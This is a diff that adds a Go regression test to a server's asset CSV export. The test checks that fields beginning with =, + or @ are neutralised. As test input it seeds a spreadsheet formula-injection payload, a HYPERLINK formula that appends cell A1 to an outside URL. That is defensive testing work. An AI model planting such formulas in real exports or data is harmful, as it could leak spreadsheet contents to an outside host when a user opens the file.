@@ -263,3 +263,58 @@ func TestAuditExportDoesNotHandTheSpreadsheetAFormula(t *testing.T) {
 		}
 	}
 }
+
+// The asset export has the same shape as the audit one and the same reader: an
+// administrator opening a downloaded file in a spreadsheet. The text here is
+// what a monitored host reported for its name, and what an operator typed for
+// the department and location.
+func TestAssetExportDoesNotHandTheSpreadsheetAFormula(t *testing.T) {
+	runtime := storagetest.Open(t)
+	defer runtime.Close()
+	server := testServer(t, runtime)
+	cookie, csrf := authenticateInitialAdmin(t, server, runtime)
+
+	hostile := `=HYPERLINK("http://elsewhere/"&A1,"open")`
+	created := performAuthenticatedJSON(
+		t, server, http.MethodPost, "/api/v1/assets",
+		map[string]any{
+			"asset_key": "host:export-probe",
+			"name":      hostile,
+			"type":      "host",
+			// A department is free text on the asset editor's form.
+			"owner_department": "@" + hostile,
+			"location":         "+" + hostile,
+		},
+		cookie, csrf,
+	)
+	if created.Code != http.StatusCreated && created.Code != http.StatusOK {
+		t.Fatalf("seeding the asset failed: %d %s", created.Code, created.Body.String())
+	}
+
+	response := performAuthenticatedJSON(
+		t, server, http.MethodGet, "/api/v1/assets.csv", nil, cookie, csrf,
+	)
+	if response.Code != http.StatusOK {
+		t.Fatalf("export status = %d body = %s", response.Code, response.Body)
+	}
+
+	body := response.Body.String()
+	if !strings.Contains(body, "HYPERLINK") {
+		t.Fatalf("the recorded text did not reach the export at all: %s", body)
+	}
+	for _, line := range strings.Split(body, "\n") {
+		for _, field := range strings.Split(line, ",") {
+			trimmed := strings.TrimPrefix(strings.TrimSpace(field), `"`)
+			if trimmed == "" {
+				continue
+			}
+			switch trimmed[0] {
+			case '=', '+', '@':
+				t.Errorf(
+					"a field begins with %q, which a spreadsheet evaluates: %s",
+					trimmed[0], field,
+				)
+			}
+		}
+	}
+}
